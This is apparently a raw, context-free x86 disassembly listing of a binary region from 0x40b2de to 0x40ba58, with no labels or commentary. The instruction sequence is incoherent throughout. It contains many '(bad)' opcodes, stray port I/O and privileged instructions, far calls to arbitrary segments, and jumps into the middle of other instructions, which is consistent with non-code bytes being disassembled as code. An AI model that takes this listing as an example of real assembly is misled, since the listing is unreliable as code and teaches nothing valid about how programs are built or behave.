  40b2de:	sub    DWORD PTR [esi],esp
  40b2e0:	sub    al,bl
  40b2e2:	into   
  40b2e3:	xor    esp,DWORD PTR [ecx+0x2e]
  40b2e6:	and    esp,0xffffff9d
  40b2e9:	xchg   esi,eax
  40b2ea:	adc    al,BYTE PTR [ecx-0x43]
  40b2ed:	in     al,0x5b
  40b2ef:	pop    edx
  40b2f0:	lods   al,BYTE PTR ds:[esi]
  40b2f1:	push   ds
  40b2f2:	pop    ebx
  40b2f3:	inc    ecx
  40b2f4:	les    eax,FWORD PTR [edi+0x7ff0959a]
  40b2fa:	test   al,0xa4
  40b2fc:	mov    gs,WORD PTR [edx-0x593cd55]
  40b302:	pop    edx
  40b303:	push   ss
  40b304:	add    BYTE PTR ss:[edi],dh
  40b307:	cdq    
  40b308:	mov    ds:0x8e103394,eax
  40b30d:	rcr    BYTE PTR [edi-0x18af43d7],1
  40b313:	loopne 0x40b386
  40b315:	jbe    0x40b374
  40b317:	(bad)  
  40b318:	pop    ecx
  40b319:	out    0x81,al
  40b31b:	je     0x40b2b2
  40b31d:	xor    eax,0xb1f8b3e2
  40b322:	repz sbb edi,DWORD PTR [ebx-0x41]
  40b326:	add    eax,0x4b298d52
  40b32b:	or     al,0x3
  40b32d:	aad    0x56
  40b32f:	pop    ebp
  40b330:	fldcw  WORD PTR es:0xd51810d7
  40b337:	cmp    ecx,DWORD PTR [edi+0x6a]
  40b33a:	jae    0x40b2c1
  40b33c:	mov    DWORD PTR [edi+0x72],ebp
  40b33f:	mov    dh,0x89
  40b341:	mov    eax,0x5f5ac51d
  40b346:	push   edx
  40b347:	nop
  40b348:	jno    0x40b2fc
  40b34a:	mov    bl,0xfe
  40b34c:	in     al,0x4
  40b34e:	int3   
  40b34f:	add    eax,0x98a450dd
  40b354:	call   0xccda:0x1e00cb48
  40b35b:	or     dh,dh
  40b35d:	sbb    DWORD PTR [eax],eax
  40b35f:	jecxz  0x40b3d3
  40b361:	push   ebx
  40b362:	ret    
  40b363:	jge    0x40b3e4
  40b365:	adc    eax,0xec24f41d
  40b36a:	pop    eax
  40b36b:	push   ecx
  40b36c:	and    al,0x13
  40b36e:	sub    edx,edi
  40b370:	jmp    0x40b300
  40b372:	mov    ch,0xb3
  40b374:	rcr    DWORD PTR [edx-0x21],1
  40b377:	push   es
  40b378:	test   al,0xd0
  40b37a:	leave  
  40b37b:	int    0x50
  40b37d:	sub    DWORD PTR [esi],esp
  40b37f:	mov    bh,0x75
  40b381:	test   eax,0xb0d853fa
  40b386:	lods   al,BYTE PTR ds:[esi]
  40b387:	call   0x2547:0x87b2751a
  40b38e:	ins    BYTE PTR es:[edi],dx
  40b38f:	enter  0x6fbb,0x91
  40b393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b394:	xchg   ebx,eax
  40b395:	jae    0x40b3ac
  40b397:	xchg   esi,eax
  40b398:	push   ebx
  40b399:	lock loop 0x40b3c3
  40b39c:	cli    
  40b39d:	pop    esi
  40b39e:	push   es
  40b39f:	aas    
  40b3a0:	fsubr  QWORD PTR [eax+0x9]
  40b3a3:	cmp    DWORD PTR [ecx-0x16c6598e],esp
  40b3a9:	retf   
  40b3aa:	loope  0x40b34e
  40b3ac:	xor    ebx,eax
  40b3ae:	jns    0x40b423
  40b3b0:	fcom   QWORD PTR [edi-0x52]
  40b3b3:	jne    0x40b39f
  40b3b5:	imul   ebp,DWORD PTR [esp+edx*1-0x66],0xf98f82bc
  40b3bd:	(bad)  
  40b3be:	out    0xee,al
  40b3c0:	push   cs
  40b3c1:	js     0x40b34e
  40b3c3:	mov    dh,0xbb
  40b3c5:	ss cdq 
  40b3c7:	pop    ds
  40b3c8:	jno    0x40b41a
  40b3ca:	cdq    
  40b3cb:	fwait
  40b3cc:	imul   eax,DWORD PTR [eax+0x6c2e09f5],0xffffffe5
  40b3d3:	inc    ebx
  40b3d4:	pop    edx
  40b3d5:	(bad)  
  40b3d7:	loope  0x40b41d
  40b3d9:	adc    esp,DWORD PTR [ebx+edx*8-0x59]
  40b3dd:	test   al,0x18
  40b3df:	mov    DWORD PTR [ebp-0x64bf29ab],edi
  40b3e5:	imul   esi,DWORD PTR [esi+0x68990d7],0xfffffff0
  40b3ec:	sbb    DWORD PTR [ebx+0x25],esi
  40b3ef:	cmp    DWORD PTR [edi-0x45],edx
  40b3f2:	movsx  esp,si
  40b3f5:	add    dl,BYTE PTR [ebx+0x71]
  40b3f8:	mov    ah,0xad
  40b3fa:	jmp    0x40b41c
  40b3fc:	daa    
  40b3fd:	bound  edx,QWORD PTR [eax-0x590756a0]
  40b403:	cmp    eax,0xcac7b7b3
  40b408:	jmp    0xb7a7fa7a
  40b40d:	jg     0x40b42e
  40b40f:	rcr    DWORD PTR [esp+edi*8],1
  40b412:	mov    cl,0xa5
  40b414:	fimul  DWORD PTR [ebp+esi*4+0x72]
  40b418:	or     ebp,DWORD PTR [edx+0x68]
  40b41b:	inc    esi
  40b41c:	push   esp
  40b41d:	pop    ebx
  40b41e:	push   ss
  40b41f:	std    
  40b420:	pusha  
  40b421:	pop    ds
  40b422:	fcomp  QWORD PTR [edx+0x4a3efde9]
  40b428:	adc    bh,ah
  40b42a:	stos   DWORD PTR es:[edi],eax
  40b42b:	clc    
  40b42c:	jg     0x40b48b
  40b42e:	test   DWORD PTR es:[edx-0x1eee71fb],edx
  40b435:	sub    BYTE PTR fs:[ebx+0x79],bl
  40b439:	xor    ebp,DWORD PTR [ebx+0x35645fe3]
  40b43f:	mov    ecx,DWORD PTR [ebx-0x1c]
  40b442:	pusha  
  40b443:	cld    
  40b444:	ss adc al,0xe7
  40b447:	fdivr  DWORD PTR [ecx]
  40b449:	jb     0x40b4ad
  40b44b:	dec    eax
  40b44c:	dec    eax
  40b44d:	jl     0x40b4a1
  40b44f:	outs   dx,BYTE PTR ds:[esi]
  40b450:	inc    BYTE PTR [edx+0x55]
  40b453:	outs   dx,DWORD PTR ds:[esi]
  40b454:	repz add ebx,edi
  40b457:	fistp  DWORD PTR [eax]
  40b459:	and    al,0x71
  40b45b:	mov    ds:0x8abaa64,al
  40b460:	inc    ebp
  40b461:	sahf   
  40b462:	cmp    al,BYTE PTR [esi-0x689ac559]
  40b468:	jo     0x40b4c7
  40b46a:	fstp   TBYTE PTR [ecx]
  40b46c:	(bad)  
  40b46d:	sahf   
  40b46e:	lods   al,BYTE PTR ds:[esi]
  40b46f:	(bad)  
  40b470:	xchg   edx,eax
  40b471:	icebp  
  40b472:	ja     0x40b443
  40b474:	add    BYTE PTR [edx],0xae
  40b477:	xchg   BYTE PTR [edx],dh
  40b479:	nop
  40b47a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b47b:	popf   
  40b47c:	dec    ebx
  40b47d:	xchg   ebp,eax
  40b47e:	cs lock mov esi,0x9f1420e7
  40b485:	ret    
  40b486:	enter  0xe13b,0x2c
  40b48a:	cwde   
  40b48b:	dec    ecx
  40b48c:	xchg   ebx,eax
  40b48d:	push   ss
  40b48e:	and    ch,al
  40b490:	ins    DWORD PTR es:[edi],dx
  40b491:	inc    ebx
  40b492:	mov    ah,0xc7
  40b494:	addr16 test al,0x34
  40b497:	mov    cl,0xc3
  40b499:	lock popf 
  40b49b:	retf   
  40b49c:	lods   eax,DWORD PTR ds:[esi]
  40b49d:	sub    dl,cl
  40b49f:	ins    BYTE PTR es:[edi],dx
  40b4a0:	mov    ds:0x4a6062ea,eax
  40b4a5:	cvtdq2ps xmm3,xmm6
  40b4a8:	cmp    dl,ch
  40b4aa:	fldcw  WORD PTR [ebp-0x8]
  40b4ad:	rol    DWORD PTR [edi-0x2dc441a3],0x63
  40b4b4:	sbb    eax,0x92d31358
  40b4b9:	cmp    ecx,DWORD PTR ds:0x5230b297
  40b4bf:	call   0x27e3:0xd1187e8f
  40b4c6:	and    ebx,DWORD PTR [ebp+ecx*4-0x30]
  40b4ca:	ror    BYTE PTR [eax+edi*1-0x2b90a867],1
  40b4d1:	shl    BYTE PTR ds:0x5f8b6216,cl
  40b4d7:	xchg   edx,eax
  40b4d8:	shl    DWORD PTR [eax+0x5c],0x49
  40b4dc:	fidivr DWORD PTR [edx-0x60]
  40b4df:	or     bl,bl
  40b4e1:	adc    BYTE PTR [edi-0x3a],al
  40b4e4:	cwde   
  40b4e5:	pop    esp
  40b4e6:	dec    esi
  40b4e7:	int3   
  40b4e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4e9:	int3   
  40b4ea:	xor    al,0x65
  40b4ec:	fimul  WORD PTR [ebx]
  40b4ee:	sti    
  40b4ef:	and    ch,bh
  40b4f1:	mov    edx,0x93695ba7
  40b4f6:	outs   dx,DWORD PTR ds:[esi]
  40b4f7:	ficomp WORD PTR [edi+0x55089489]
  40b4fd:	lock fisttp QWORD PTR [ebx]
  40b500:	sub    DWORD PTR [edi],0xffffff8d
  40b503:	sbb    al,0x87
  40b505:	push   0xd5d00bcb
  40b50a:	(bad)  
  40b50b:	adc    eax,0xba4a9223
  40b510:	popf   
  40b511:	mov    bl,0xf8
  40b513:	das    
  40b514:	in     al,dx
  40b515:	mov    dh,0x64
  40b517:	aas    
  40b518:	adc    BYTE PTR [esi],0x45
  40b51b:	ror    dh,0x26
  40b51e:	stos   BYTE PTR es:[edi],al
  40b51f:	clc    
  40b520:	pop    edx
  40b521:	fst    QWORD PTR [esi]
  40b523:	push   cs
  40b524:	mov    ebx,0xe949e819
  40b529:	retf   0x87c5
  40b52c:	dec    ecx
  40b52d:	test   eax,0xee6defd
  40b532:	cmc    
  40b533:	sbb    cl,BYTE PTR [esi-0x6b34c5be]
  40b539:	mov    esi,0xcfa3044f
  40b53e:	sti    
  40b53f:	rcr    BYTE PTR [edi],1
  40b541:	fiadd  DWORD PTR ds:0x38067f76
  40b547:	add    BYTE PTR [esi],ch
  40b549:	retf   
  40b54a:	jo     0x40b577
  40b54c:	popa   
  40b54d:	fwait
  40b54e:	loop   0x40b5a4
  40b550:	push   edx
  40b551:	inc    edx
  40b552:	loop   0x40b524
  40b554:	adc    ah,BYTE PTR [ebx+0x62]
  40b557:	aas    
  40b558:	mov    ebp,0xd20e0031
  40b55d:	or     dl,BYTE PTR [ebp-0x2a]
  40b560:	imul   eax,esi,0x1d
  40b563:	nop
  40b564:	(bad)  
  40b565:	jno    0x40b5a1
  40b567:	pusha  
  40b568:	repz ror bl,1
  40b56b:	push   0x75294270
  40b570:	jns    0x40b58b
  40b572:	ret    
  40b573:	retf   0xc196
  40b576:	xor    eax,0xbc460375
  40b57b:	inc    edi
  40b57c:	mov    dh,0x7
  40b57e:	inc    ebp
  40b57f:	jge    0x40b549
  40b581:	mov    bh,0x8c
  40b583:	sub    edi,eax
  40b585:	mov    eax,ds:0x325607cd
  40b58a:	mov    ds:0xb99fb6b0,al
  40b58f:	mov    al,ds:0x134669c4
  40b594:	sbb    eax,0x482af511
  40b599:	aaa    
  40b59a:	arpl   WORD PTR [eax-0x47],dx
  40b59d:	pop    es
  40b59e:	mov    eax,ds:0xf1be6151
  40b5a3:	push   cs
  40b5a4:	loope  0x40b548
  40b5a6:	ror    BYTE PTR [edi-0x4c4458be],cl
  40b5ac:	icebp  
  40b5ad:	pusha  
  40b5ae:	in     al,dx
  40b5af:	add    ecx,DWORD PTR [ebx+0x74cd1102]
  40b5b5:	mov    al,ds:0x801060b9
  40b5ba:	scas   eax,DWORD PTR es:[edi]
  40b5bb:	call   DWORD PTR [ecx+0x1c645c53]
  40b5c1:	push   ebx
  40b5c2:	or     BYTE PTR [eax+0x394b5345],cl
  40b5c8:	mov    bl,0x2c
  40b5ca:	mov    dh,0x55
  40b5cc:	add    eax,0xce200fbe
  40b5d1:	sahf   
  40b5d2:	popf   
  40b5d3:	gs (bad) 
  40b5d5:	cdq    
  40b5d6:	(bad)  
  40b5d7:	loop   0x40b5de
  40b5d9:	jb     0x40b5fe
  40b5db:	cmp    BYTE PTR [ebx*1-0x45aefe02],ah
  40b5e2:	fwait
  40b5e3:	stos   BYTE PTR es:[edi],al
  40b5e4:	in     al,0x83
  40b5e6:	mov    dl,BYTE PTR [eax]
  40b5e8:	push   cs
  40b5e9:	xchg   edx,eax
  40b5ea:	or     dl,bl
  40b5ec:	push   edi
  40b5ed:	cmp    al,BYTE PTR [eax]
  40b5ef:	sbb    bh,dh
  40b5f1:	inc    ecx
  40b5f2:	enter  0xeaec,0x86
  40b5f6:	shr    DWORD PTR [ebp+ebp*8+0x31],0x16
  40b5fb:	jo     0x40b675
  40b5fd:	(bad)  
  40b5fe:	hlt    
  40b5ff:	mov    DWORD PTR [ecx+0x5a],esp
  40b602:	stos   DWORD PTR es:[edi],eax
  40b603:	in     al,dx
  40b604:	minps  xmm1,XMMWORD PTR [ebp-0x58]
  40b608:	xchg   ebx,eax
  40b609:	stc    
  40b60a:	cs ret 0xe86f
  40b60e:	xor    eax,0xf136de66
  40b613:	dec    esp
  40b614:	dec    ecx
  40b615:	icebp  
  40b616:	and    ebx,esp
  40b618:	dec    esi
  40b619:	and    eax,0x48f22b57
  40b61e:	xor    esp,DWORD PTR [ebx-0x5f]
  40b621:	mov    bl,al
  40b623:	jle    0x40b65a
  40b625:	jns    0x40b60c
  40b627:	sahf   
  40b628:	imul   eax,DWORD PTR [eax-0x5],0x5de825a7
  40b62f:	mov    bh,0x8c
  40b631:	add    ecx,edx
  40b633:	hlt    
  40b634:	out    dx,eax
  40b635:	daa    
  40b636:	iret   
  40b637:	sti    
  40b638:	pop    ebp
  40b639:	mov    ah,0xe5
  40b63b:	inc    eax
  40b63c:	outs   dx,DWORD PTR ds:[esi]
  40b63d:	dec    edi
  40b63e:	mov    dl,0x84
  40b640:	clc    
  40b641:	jp     0x40b653
  40b643:	sbb    al,0x2b
  40b645:	ds mov ah,0x3f
  40b648:	mov    ds:0xb49e6d3c,al
  40b64d:	jp     0x40b66c
  40b64f:	dec    ecx
  40b650:	ret    
  40b651:	push   edi
  40b652:	mov    ch,BYTE PTR [esp+ebp*1-0x5084d4fd]
  40b659:	rcr    DWORD PTR [eax-0x5],1
  40b65c:	test   eax,0x52e006b2
  40b661:	cmp    BYTE PTR [ebp+0x47],bl
  40b664:	bound  ebx,QWORD PTR [esi-0xc]
  40b667:	push   esi
  40b668:	shl    BYTE PTR [eax],1
  40b66a:	xor    eax,0x6243d378
  40b66f:	stc    
  40b670:	stos   DWORD PTR es:[edi],eax
  40b671:	sbb    dh,BYTE PTR [edi]
  40b673:	in     eax,0x37
  40b675:	or     ebp,0xf393d0d1
  40b67b:	xor    ecx,DWORD PTR [edx+0x53]
  40b67e:	test   BYTE PTR [ebp+0x2a],dl
  40b681:	in     eax,0xfe
  40b683:	retf   
  40b684:	outs   dx,DWORD PTR ds:[esi]
  40b685:	in     al,0xf0
  40b687:	call   DWORD PTR [esi+0x4c]
  40b68a:	js     0x40b6c1
  40b68c:	ret    
  40b68d:	frstor [ebp+0x3]
  40b690:	jmp    0x40b687
  40b692:	push   ebx
  40b693:	data16 jl 0x40b691
  40b696:	pop    esp
  40b697:	and    ah,ah
  40b699:	pop    ecx
  40b69a:	andps  xmm0,XMMWORD PTR [ecx-0x36526889]
  40b6a1:	int    0x75
  40b6a3:	xor    dl,dh
  40b6a5:	stc    
  40b6a6:	(bad)  
  40b6a8:	xchg   edi,eax
  40b6a9:	loopne 0x40b64c
  40b6ab:	jbe    0x40b667
  40b6ad:	call   0x3d79:0x1e7ef3e8
  40b6b4:	call   0x6a13bb5e
  40b6b9:	icebp  
  40b6ba:	lds    esp,FWORD PTR [eax+0x282d3b07]
  40b6c0:	or     cl,BYTE PTR ss:[esp+eax*4-0xb]
  40b6c5:	pushf  
  40b6c6:	xchg   edi,eax
  40b6c7:	xor    bh,BYTE PTR [esi]
  40b6c9:	test   BYTE PTR [ebp+0x43212d3e],dh
  40b6cf:	outs   dx,DWORD PTR ds:[esi]
  40b6d0:	push   esp
  40b6d1:	mov    ebp,0x726a9cb3
  40b6d6:	push   ss
  40b6d7:	ins    DWORD PTR es:[edi],dx
  40b6d8:	inc    esi
  40b6d9:	cmp    eax,eax
  40b6db:	sub    ecx,DWORD PTR [edx]
  40b6dd:	sub    DWORD PTR [edx],edi
  40b6df:	retf   0xf11b
  40b6e2:	mov    ds:0x4ce3dfc6,al
  40b6e7:	fbstp  TBYTE PTR [ecx-0x35]
  40b6ea:	(bad)  
  40b6ec:	add    ebx,0xe7b657bd
  40b6f2:	(bad)  
  40b6f4:	mov    cl,ah
  40b6f6:	jl     0x40b6d4
  40b6f8:	xor    DWORD PTR [ebx*4+0x5aa68193],ebx
  40b6ff:	fwait
  40b700:	mov    ah,0x38
  40b702:	repnz (bad) 
  40b704:	pop    edx
  40b705:	cwde   
  40b706:	mov    al,ds:0x32a8f796
  40b70b:	mov    ds:0x293da177,al
  40b710:	out    0x9,al
  40b712:	stc    
  40b713:	jg     0x40b6c3
  40b715:	js     0x40b730
  40b717:	lea    esi,[ecx+ecx*2]
  40b71a:	sub    ecx,edx
  40b71c:	xchg   ecx,eax
  40b71d:	stos   DWORD PTR es:[edi],eax
  40b71e:	xor    al,0xe
  40b720:	adc    eax,0xf66c5160
  40b725:	stos   BYTE PTR es:[edi],al
  40b726:	ja     0x40b71e
  40b728:	scas   al,BYTE PTR es:[edi]
  40b729:	test   eax,0x131c670e
  40b72e:	call   0x2b61:0x91e13b32
  40b735:	cmp    bh,dl
  40b737:	inc    edx
  40b738:	xchg   esi,eax
  40b739:	sbb    BYTE PTR [ebp+0x425788dd],dh
  40b73f:	xchg   ebx,eax
  40b740:	addr16 inc esi
  40b742:	popf   
  40b743:	div    DWORD PTR [ebp+0x7737d9f9]
  40b749:	push   ds
  40b74a:	mov    ch,0xa8
  40b74c:	or     BYTE PTR [ebp-0x60621049],0x9
  40b753:	dec    ebx
  40b754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b755:	inc    DWORD PTR [esp+ebx*2-0x68]
  40b759:	adc    bl,BYTE PTR [edx-0x1d8d01aa]
  40b75f:	pop    eax
  40b760:	add    esp,ebp
  40b762:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b763:	aad    0x82
  40b765:	cmc    
  40b766:	push   esi
  40b767:	pushf  
  40b768:	scas   eax,DWORD PTR es:[edi]
  40b769:	mov    dh,0xf9
  40b76b:	xor    DWORD PTR [edx-0x159699a9],edi
  40b771:	mov    cl,BYTE PTR [ebx-0x1f397057]
  40b777:	fsub   DWORD PTR es:[edi+0x92fa9bd]
  40b77e:	out    dx,al
  40b77f:	(bad)  
  40b780:	cmp    esp,DWORD PTR [edx]
  40b782:	inc    esp
  40b783:	sbb    dh,BYTE PTR [ebp+0x6f845619]
  40b789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b78a:	xor    eax,ebx
  40b78c:	mov    dh,0x85
  40b78e:	jae    0x40b7ee
  40b790:	fidiv  WORD PTR [edi+0x56]
  40b793:	jae    0x40b804
  40b795:	cmp    DWORD PTR [ecx+edi*8-0x61],0x3d
  40b79a:	inc    esp
  40b79b:	aad    0x4
  40b79d:	rcl    BYTE PTR [esi+ebx*1+0x6c],cl
  40b7a1:	sub    esi,DWORD PTR [ebx+0x53f1e49a]
  40b7a7:	jb     0x40b823
  40b7a9:	gs pop esi
  40b7ab:	mov    dh,0x5f
  40b7ad:	lock call 0x9476:0xdaff730
  40b7b5:	(bad)  
  40b7b6:	out    dx,al
  40b7b7:	adc    cl,al
  40b7b9:	inc    ecx
  40b7ba:	push   eax
  40b7bb:	retf   0xa725
  40b7be:	sahf   
  40b7bf:	mov    ebp,0xaa11cb0f
  40b7c4:	sahf   
  40b7c5:	in     eax,0x94
  40b7c7:	in     al,0xa7
  40b7c9:	mov    ecx,0x8a463de9
  40b7ce:	push   cs
  40b7cf:	out    dx,eax
  40b7d0:	jo     0x40b7b1
  40b7d2:	jecxz  0x40b77b
  40b7d4:	jns    0x40b801
  40b7d6:	sbb    al,0xa4
  40b7d8:	sti    
  40b7d9:	ins    BYTE PTR es:[edi],dx
  40b7da:	mov    ds:0xf6a1f6cb,al
  40b7df:	popf   
  40b7e0:	fistp  DWORD PTR [ebx+0x6a65c2ca]
  40b7e6:	add    al,0x36
  40b7e8:	mov    ds,WORD PTR [ecx+0x47]
  40b7eb:	xchg   edi,eax
  40b7ec:	scas   eax,DWORD PTR es:[edi]
  40b7ed:	loope  0x40b7ab
  40b7ef:	mov    ebp,0x1712078c
  40b7f4:	xchg   bl,dl
  40b7f6:	xor    eax,0x71f129a6
  40b7fb:	retf   
  40b7fc:	sub    WORD PTR [ebp+0x588cfb62],ax
  40b803:	shl    DWORD PTR [ebp-0x78d6008],1
  40b809:	inc    eax
  40b80a:	(bad)  
  40b80b:	setbe  BYTE PTR [edx-0xa]
  40b80f:	or     eax,DWORD PTR [ecx+esi*2+0x3b]
  40b813:	outs   dx,BYTE PTR ds:[esi]
  40b814:	arpl   WORD PTR [ecx],di
  40b816:	inc    edi
  40b817:	neg    BYTE PTR [ecx]
  40b819:	sub    dh,BYTE PTR [esi+ebx*8+0x9]
  40b81d:	sbb    DWORD PTR es:[eax+edx*4+0x27],ecx
  40b822:	ss mov dh,0xb8
  40b825:	aas    
  40b826:	mov    al,0x4c
  40b828:	(bad)  
  40b829:	xor    eax,0x42e6834f
  40b82e:	fistp  QWORD PTR ds:0x7436cb65
  40b834:	sahf   
  40b835:	std    
  40b836:	pusha  
  40b837:	mov    bl,0x9e
  40b839:	jmp    0x40b818
  40b83b:	mov    DWORD PTR [esi-0x23cb8989],edi
  40b841:	les    ebx,FWORD PTR [ecx-0x245fcd15]
  40b847:	dec    edi
  40b848:	adc    ebp,DWORD PTR [edx]
  40b84a:	sbb    cl,BYTE PTR [ecx-0x56]
  40b84d:	dec    edi
  40b84e:	int    0x94
  40b850:	int3   
  40b851:	xchg   DWORD PTR [ebx-0x4d],ebx
  40b854:	test   DWORD PTR [ebx],0x2c6add65
  40b85a:	sbb    dh,BYTE PTR [ebx]
  40b85c:	fidivr WORD PTR [edx+esi*2-0x1a]
  40b860:	xlat   BYTE PTR ds:[ebx]
  40b861:	cmp    BYTE PTR [ebp-0x373bc848],bl
  40b867:	add    BYTE PTR [ecx],cl
  40b869:	outs   dx,BYTE PTR ds:[esi]
  40b86a:	test   esi,eax
  40b86c:	fnsave [ebx]
  40b86e:	dec    ebp
  40b86f:	cmp    bh,dl
  40b871:	ficom  WORD PTR [esi]
  40b873:	les    edx,FWORD PTR [ebp+ebx*8+0x574467bb]
  40b87a:	ret    0xa4e
  40b87d:	ds jecxz 0x40b8e6
  40b880:	pop    ss
  40b881:	pushf  
  40b882:	push   ds
  40b883:	jecxz  0x40b81f
  40b885:	arpl   bp,di
  40b887:	xor    BYTE PTR [ebp+0x757cd8e4],dh
  40b88d:	cmp    al,0xb
  40b88f:	js     0x40b88e
  40b891:	jmp    0xc0408782
  40b896:	es jl  0x40b868
  40b899:	mov    ds:0xbf851761,eax
  40b89e:	es push 0x57
  40b8a1:	adc    edi,DWORD PTR [edi-0x5d89e710]
  40b8a7:	xlat   BYTE PTR ds:[ebx]
  40b8a8:	iret   
  40b8a9:	pop    eax
  40b8aa:	mov    eax,0xda110a5b
  40b8af:	pop    edi
  40b8b0:	xchg   edi,eax
  40b8b1:	movaps XMMWORD PTR [edx-0x79e278ed],xmm5
  40b8b8:	bound  esp,QWORD PTR [eax-0x27]
  40b8bb:	sar    BYTE PTR [eax+0x821083f],cl
  40b8c1:	mov    edi,0x23a4c650
  40b8c6:	test   ah,bh
  40b8c8:	or     edx,DWORD PTR ds:[esi]
  40b8cb:	ret    0x9c93
  40b8ce:	sbb    eax,0x7635f2c7
  40b8d3:	mov    ebp,edx
  40b8d5:	addr16 or al,0x39
  40b8d8:	fnstenv [ebx-0x8ad3864]
  40b8de:	jbe    0x40b87f
  40b8e0:	cmc    
  40b8e1:	popa   
  40b8e2:	adc    al,0xba
  40b8e4:	push   eax
  40b8e5:	xor    al,0x93
  40b8e7:	or     BYTE PTR [edi-0x27],al
  40b8ea:	jne    0x40b91f
  40b8ec:	call   0x6a9d9c93
  40b8f1:	div    al
  40b8f3:	fs pop ecx
  40b8f5:	add    dl,0x6a
  40b8f8:	addr16 mov eax,ds:0x6d03
  40b8fc:	or     al,BYTE PTR [edx+ebp*8+0x35f30c16]
  40b903:	dec    ecx
  40b904:	jmp    0x3768ddb4
  40b909:	js     0x40b8c6
  40b90b:	fs sbb edi,esp
  40b90e:	sbb    eax,0x848b6cc
  40b913:	cli    
  40b914:	xchg   ecx,eax
  40b915:	out    0xc1,al
  40b917:	or     DWORD PTR [eax+eax*2-0x76],edi
  40b91b:	es xor al,0xc8
  40b91e:	call   0xc691:0xbbda4438
  40b925:	xchg   edi,eax
  40b926:	stos   BYTE PTR es:[edi],al
  40b927:	ret    0x95a2
  40b92a:	imul   eax,DWORD PTR [ebp+0x3418f00e],0xffffffba
  40b931:	xchg   esp,eax
  40b932:	cmp    eax,0x90f84da4
  40b937:	push   eax
  40b938:	stos   DWORD PTR es:[edi],eax
  40b939:	and    eax,0x4047273d
  40b93e:	push   ds
  40b93f:	jno    0x40b9a6
  40b941:	jmp    0x40b944
  40b943:	arpl   sp,sp
  40b945:	jo     0x40b8dd
  40b947:	dec    ebp
  40b948:	fdiv   DWORD PTR [esi]
  40b94a:	test   DWORD PTR [edi+0x1],0xba129a53
  40b951:	and    eax,0x6587eda0
  40b956:	fwait
  40b957:	or     al,0xa5
  40b959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b95a:	fild   DWORD PTR [ebx]
  40b95c:	ror    bl,0x28
  40b95f:	leave  
  40b960:	xor    eax,0xa9778683
  40b965:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40b967:	cmp    DWORD PTR [ecx+ebx*2],0x56
  40b96b:	test   BYTE PTR [eax-0x30],al
  40b96e:	mov    es,WORD PTR ds:0x2c61d191
  40b974:	pop    edx
  40b975:	mov    esi,0x74812639
  40b97a:	jecxz  0x40b9ea
  40b97c:	jp     0x40b97a
  40b97e:	repnz mov cl,0x1b
  40b981:	xchg   edx,eax
  40b982:	push   edi
  40b983:	nop
  40b984:	xor    eax,0xb3579971
  40b989:	xor    DWORD PTR [edi],eax
  40b98b:	je     0x40b9dc
  40b98d:	cmp    eax,0x8e4eac96
  40b992:	enter  0xdf4a,0x1b
  40b996:	outs   dx,BYTE PTR ds:[esi]
  40b997:	mov    dl,0xf9
  40b999:	dec    ebp
  40b99a:	xchg   ebx,eax
  40b99b:	in     eax,dx
  40b99c:	(bad)  
  40b99d:	push   esp
  40b99e:	imul   eax,DWORD PTR [ecx+ecx*2],0x33
  40b9a2:	pop    ebp
  40b9a3:	int    0x47
  40b9a5:	not    ebx
  40b9a7:	mov    bh,BYTE PTR [ebx]
  40b9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9aa:	pop    ds
  40b9ab:	jg     0x40ba2b
  40b9ad:	pop    ecx
  40b9ae:	xchg   esi,eax
  40b9af:	lea    ecx,[ebx]
  40b9b1:	adc    DWORD PTR ds:0xf5b71943,ebp
  40b9b7:	push   es
  40b9b8:	mov    ebx,ecx
  40b9ba:	sbb    ebp,esi
  40b9bc:	mov    ds:0x225f3a10,eax
  40b9c1:	idiv   DWORD PTR [edi]
  40b9c3:	sbb    DWORD PTR [ebp-0x31],0x803d1988
  40b9ca:	addr16 cli 
  40b9cc:	pushf  
  40b9cd:	stc    
  40b9ce:	outs   dx,DWORD PTR ds:[esi]
  40b9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9d0:	add    DWORD PTR [bx],esi
  40b9d3:	lods   eax,DWORD PTR ds:[esi]
  40b9d4:	cmp    al,0x37
  40b9d6:	and    ah,ah
  40b9d8:	rcr    dh,cl
  40b9da:	xor    eax,0xe56d277
  40b9df:	jl     0x40b97a
  40b9e1:	idiv   BYTE PTR [eax-0x7a65e75f]
  40b9e7:	and    bl,ah
  40b9e9:	cmp    al,0x2
  40b9eb:	lock dec esi
  40b9ed:	outs   dx,BYTE PTR ds:[esi]
  40b9ee:	sub    al,0x56
  40b9f0:	aam    0xa1
  40b9f2:	shl    bh,cl
  40b9f4:	cwde   
  40b9f5:	xor    eax,0xffffffd6
  40b9f8:	xchg   edi,eax
  40b9f9:	push   ebx
  40b9fa:	mov    al,0x7d
  40b9fc:	mov    ebx,0x9c7a8942
  40ba01:	aas    
  40ba02:	mov    ah,BYTE PTR ds:[ebp-0x66fd32a7]
  40ba09:	dec    ecx
  40ba0a:	cmp    BYTE PTR [ecx-0x77],bl
  40ba0d:	sbb    al,0x51
  40ba0f:	arpl   WORD PTR [ecx+0x249c9ef0],cx
  40ba15:	clc    
  40ba16:	mov    ah,0x6e
  40ba18:	lock jb 0x40ba65
  40ba1b:	xchg   edx,eax
  40ba1c:	xchg   ebx,eax
  40ba1d:	sbb    eax,DWORD PTR [edx]
  40ba1f:	and    eax,DWORD PTR [edx]
  40ba21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba22:	push   ebp
  40ba23:	dec    esp
  40ba24:	lea    ebp,[ecx-0x43f1575]
  40ba2a:	pop    esi
  40ba2b:	mov    WORD PTR [eax+eax*8+0x7717933a],?
  40ba32:	sub    eax,0x6d1f06a0
  40ba37:	cld    
  40ba38:	or     dh,bl
  40ba3a:	mov    ds:0xf2a95ad3,al
  40ba3f:	cwde   
  40ba40:	cmp    esp,DWORD PTR [eax-0x391dc6d5]
  40ba46:	sbb    DWORD PTR [edx],eax
  40ba48:	fs fs call 0xd1769180
  40ba4f:	call   0x2a19:0xe7dac3b9
  40ba56:	es aas 
  40ba58:	bound  eax,QWORD PTR [esi]
